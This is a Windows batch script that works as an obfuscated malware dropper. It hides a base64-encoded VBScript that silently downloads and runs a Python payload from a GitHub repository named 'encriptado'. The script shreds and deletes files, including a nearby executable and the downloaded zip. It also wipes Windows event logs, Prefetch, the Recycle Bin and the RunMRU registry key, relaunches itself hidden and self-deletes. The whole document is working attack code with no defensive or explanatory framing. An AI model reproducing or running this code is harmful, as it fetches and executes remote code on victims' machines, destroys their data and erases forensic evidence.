@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKCnNjcmlwdFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNjcmlwdE5hbWUgPSBmc28uR2V0RmlsZU5hbWUoc2NyaXB0UGF0aCkKc2NyaXB0RGlyID0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoc2NyaXB0UGF0aCkKdGVtcEJhc2UgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzY3JpcHRQYXRoKSwgTENhc2UodGVtcEJhc2UpKSA+IDAgQW5kIExDYXNlKHNjcmlwdE5hbWUpID0gImNvcmUudmJzIiBUaGVuCiAgICBleGVQYXRoID0gIiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzY3JpcHREaXIpLkZpbGVzCiAgICAgICAgSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgogICAgICAgICAgICBleGVQYXRoID0gZi5QYXRoCiAgICAgICAgICAgIEV4aXQgRm9yCiAgICAgICAgRW5kIElmCiAgICBOZXh0CiAgICAKICAgIHJlcG9VUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2JyYXlhbmpob2FuY2UyLWNvbGxhYi9lbmNyaXB0YWRvL2FyY2hpdmUvcmVmcy9oZWFkcy9tYWluLnppcCIKICAgIHppcFBhdGggPSBzY3JpcHREaXIgJiAiXHJlcG8uemlwIgogICAgZXh0cmFjdFBhdGggPSBzY3JpcHREaXIgJiAiXGV4dHJhY3RlZCIKICAgIAogICAgcHNEb3dubG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwogICAgIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7ICIgJiBfCiAgICAiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KICAgICJ0cnkgeyAiICYgXwogICAgIiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICciICYgcmVwb1VSTCAmICInIC1PdXRGaWxlICciICYgemlwUGF0aCAmICInIC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwOyAiICYgXwogICAgIiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiAmIHppcFBhdGggJiAiJyAtRGVzdGluYXRpb25QYXRoICciICYgZXh0cmFjdFBhdGggJiAiJyAtRm9yY2UgIiAmIF8KICAgICJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KICAgICIiIiIKICAgIAogICAgc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKICAgIFdTY3JpcHQuU2xlZXAgODAwMAogICAgCiAgICBJZiBOb3QgZnNvLkZpbGVFeGlzdHMoemlwUGF0aCkgVGhlbgogICAgICAgIFdTY3JpcHQuUXVpdAogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICByZXBvUGF0aCA9ICIiCiAgICBsYXVuY2hlclBhdGggPSAiIgogICAgcHl0aG9uUGF0aCA9ICIiCiAgICAKICAgIElmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KICAgICAgICBGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwogICAgICAgICAgICBJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCiAgICAgICAgICAgICAgICByZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCiAgICAgICAgICAgICAgICBsYXVuY2hlclBhdGggPSByZXBvUGF0aCAmICJcbGF1bmNoZXIucHkiCiAgICAgICAgICAgICAgICBweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgogICAgICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICAgICAgRW5kIElmCiAgICAgICAgTmV4dAogICAgRW5kIElmCiAgICAKICAgIElmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCiAgICAgICAgc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCiAgICAgICAgY21kTGF1bmNoID0gIiIiIiAmIHB5dGhvblBhdGggJiAiIiIgIiIiICYgbGF1bmNoZXJQYXRoICYgIiIiIgogICAgICAgIHNoZWxsLlJ1biBjbWRMYXVuY2gsIDAsIEZhbHNlCiAgICAgICAgV1NjcmlwdC5TbGVlcCAxMDAwMAogICAgRW5kIElmCiAgICAKICAgIElmIGV4ZVBhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4ZVBhdGgpIFRoZW4KICAgICAgICBGb3IgaSA9IDEgVG8gMwogICAgICAgICAgICBTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCiAgICAgICAgICAgIEZvciBqID0gMSBUbyAxMDAwCiAgICAgICAgICAgICAgICBmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDI2KSArIDY1KSkKICAgICAgICAgICAgTmV4dAogICAgICAgICAgICBmdy5DbG9zZQogICAgICAgICAgICBXU2NyaXB0LlNsZWVwIDIwMAogICAgICAgIE5leHQKICAgICAgICBmc28uRGVsZXRlRmlsZSBleGVQYXRoLCBUcnVlCiAgICBFbmQgSWYKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICAKICAgIElmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KICAgICAgICB6aXBTaXplID0gZnNvLkdldEZpbGUoemlwUGF0aCkuU2l6ZQogICAgICAgIElmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMTAwMDAwMDAwIFRoZW4KICAgICAgICAgICAgRm9yIHBhc3MgPSAxIFRvIDMKICAgICAgICAgICAgICAgIHBzU2hyZWQgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIgJiBfCiAgICAgICAgICAgICAgICAiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwogICAgICAgICAgICAgICAgIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRieXRlcyk7ICIgJiBfCiAgICAgICAgICAgICAgICAiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCciICYgemlwUGF0aCAmICInLCAkYnl0ZXMpICIgJiBfCiAgICAgICAgICAgICAgICAiIiIiCiAgICAgICAgICAgICAgICBzaGVsbC5SdW4gcHNTaHJlZCwgMCwgVHJ1ZQogICAgICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCA1MDAKICAgICAgICAgICAgTmV4dAogICAgICAgIEVuZCBJZgogICAgICAgIGZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKICAgIEVuZCBJZgogICAgCiAgICBzaGVsbC5SZWdEZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVXCIKICAgIAogICAgcHNDbGVhciA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIiIiAmIF8KICAgICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwogICAgIlJlbW92ZS1JdGVtICdDOlxXaW5kb3dzXFByZWZldGNoXCoucGYnIC1Gb3JjZTsgIiAmIF8KICAgICJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2U7ICIgJiBfCiAgICAid2V2dHV0aWwgY2wgQXBwbGljYXRpb24gMj4kbnVsbDsgIiAmIF8KICAgICJ3ZXZ0dXRpbCBjbCBTeXN0ZW0gMj4kbnVsbCAiICYgXwogICAgIiIiIgogICAgc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKICAgIAogICAgV1NjcmlwdC5TbGVlcCAyMDAwCiAgICBjbGVhbnVwQmF0ID0gc2NyaXB0RGlyICYgIlxjbGVhbnVwLmJhdCIKICAgIFNldCBmYyA9IGZzby5DcmVhdGVUZXh0RmlsZShjbGVhbnVwQmF0LCBUcnVlKQogICAgZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCiAgICBmYy5Xcml0ZUxpbmUgInRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsIgogICAgZmMuV3JpdGVMaW5lICJ0YXNra2lsbCAvZiAvaW0gd3NjcmlwdC5leGUgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJkZWwgL2YgL3EgIiIiICYgc2NyaXB0UGF0aCAmICIiIiA+bnVsIDI+JjEiCiAgICBmYy5Xcml0ZUxpbmUgImNkIC9kICVURU1QJSIKICAgIGZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiKGdvdG8pIDI+bnVsICYgZGVsIC9mIC9xICIiJX5mMCIiICYgZXhpdCIKICAgIGZjLkNsb3NlCiAgICAKICAgIHNoZWxsLlJ1biAiY21kLmV4ZSAvYyAiIiIgJiBjbGVhbnVwQmF0ICYgIiIiIiwgMCwgRmFsc2UKICAgIFdTY3JpcHQuUXVpdAogICAgCkVsc2UKICAgIHRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCiAgICB0ZW1wV29yayA9IHRlbXBCYXNlICYgIlwiICYgdGVtcElECiAgICBmc28uQ3JlYXRlRm9sZGVyIHRlbXBXb3JrCiAgICAKICAgIHZic1RlbXAgPSB0ZW1wV29yayAmICJcY29yZS52YnMiCiAgICBmc28uQ29weUZpbGUgc2NyaXB0UGF0aCwgdmJzVGVtcCwgVHJ1ZQogICAgCiAgICBzaGVsbC5SdW4gIndzY3JpcHQuZXhlICIiIiAmIHZic1RlbXAgJiAiIiIgLy9CIC8vTm9sb2dvIiwgMCwgRmFsc2UKICAgIFdTY3JpcHQuU2xlZXAgMTAwMAogICAgCiAgICBmc28uRGVsZXRlRmlsZSBzY3JpcHRQYXRoLCBUcnVlCiAgICBXU2NyaXB0LlF1aXQKICAgIApFbmQgSWY='; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit